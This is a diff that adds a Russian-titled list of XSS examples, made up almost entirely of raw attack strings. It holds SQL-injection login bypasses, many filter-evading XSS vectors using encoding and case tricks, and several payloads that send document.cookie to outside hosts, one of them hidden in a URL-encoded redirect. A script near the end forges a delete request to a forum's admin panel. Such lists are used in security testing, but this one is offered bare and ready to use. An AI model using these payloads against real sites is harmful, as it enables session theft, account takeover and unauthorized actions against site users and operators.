@@ -1,0 +1,63 @@
+XSS примеры
+
+email = ‘ or ‘1’=’1
+password = ‘ or ‘1’=’1
+<script>alert('1');</script>
+<script type='text/javascript'>alert('1');</script>
+"><script>alert('1')</script>
+<script>alert('1');</script>
+'';!--"<fuck>=&{()}
+<sc<script>ript>alert()</sc</script>ript>
+"> http://******.ru/trye.asp?sessionID="><IMG%20SRC="javascript:alert();
+http://*****.ru/free?p='><script>img=new Image();img.src="http://antichat.org/s/HakNet.gif?"+document.cookie;"+document.cookie;</script>
+<script language="JavaScript">
+document.location.href="%68%74%74%70%3A%2F%2F%2A%2A%2A%2A%2A%2E%72%75%2F%66%72%65%65%3F%70%3D%27%3E%3C%73%63%72%69%70%74%20%73%72%63%3D%68%74%74%70%3A%2F%2F%68%61%6B%6E%65%74%2E%68%31%36%2E%72%75%2F%73%63%72%69%70%74%2F%6A%73%2E%6A%73%3E%3C%2F%73%63%72%69%70%74%3E"
+</script>
+var іmg = new Image(); іmg.srс = 'http://site/xss.php?' + document.cookie;
+<script>document.write('<iframe src="http://evilattacker.com?cookie='
+    + document.cookie.escape() + '" height=0 width=0 />');</script>
+<div>привет</div>
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+<script>window.location = 'haxxed.com? cookie=' + document.cookie</script>
+<img src="javascript:alert('hello everybody')"></img>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=# onmouseover="alert('xxs')">
+<IMG SRC= onmouseover="alert('xxs')">
+<IMG onmouseover="alert('xxs')">
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
+&#39;&#88;&#83;&#83;&#39;&#41;>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+"><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>
+<p>Your search for 'flowers <script>evil_script()</script>'
+http://www.bigsafebank.com/search.asp?q=<script>x=new Image;x.src =
+http://maliciousdomain~~~/hijackedsession.php?sessioncookie=”+document.co
+okie;</script>
+<b onmouseover=alert(‘XSS testing!‘)></b>
+<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
+<IMG SRC=j&#X41vascript:alert('test2')>
+ <script>
+    var params = 'type=topic&action=delete&id=347';
+    var http = new XMLHttpRequest();
+    http.open('POST', 'forum.com/admin_control.php', true);
+    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    http.setRequestHeader("Content-length", params.length);
+    http.setRequestHeader("Connection", "close");
+    http.onreadystatechange = function() {
+        if(http.readyState == 4 && http.status == 200) {
+            // Do something else.
+        }
+    };
+    http.send(params);
+ </script>
+<SCRIPT type="text/javascript">
+var adr = '../evil.php?cakemonster=' + escape(document.cookie);
+</SCRIPT>
